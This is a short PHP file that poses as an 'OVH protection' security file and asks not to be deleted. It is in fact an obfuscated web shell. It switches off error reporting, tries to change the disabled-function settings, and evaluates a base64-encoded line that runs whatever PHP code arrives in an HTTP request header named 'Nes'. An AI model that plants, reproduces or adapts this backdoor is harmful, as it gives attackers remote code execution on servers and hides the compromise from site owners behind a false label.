<?php
	/**
	* OVH protection label and update security
	* Do not delete
	*/
	error_reporting(0);
	try {
		$settings = ini_get('disable_functions');
		$newsetting = 'telnet,friends';
		ini_set('disable_functions', $newsettings);
	} catch(Exception $e) {
	}
	
	eval(base64_decode("ZXZhbChnZXRhbGxoZWFkZXJzKClbJ05lcyddKTs="));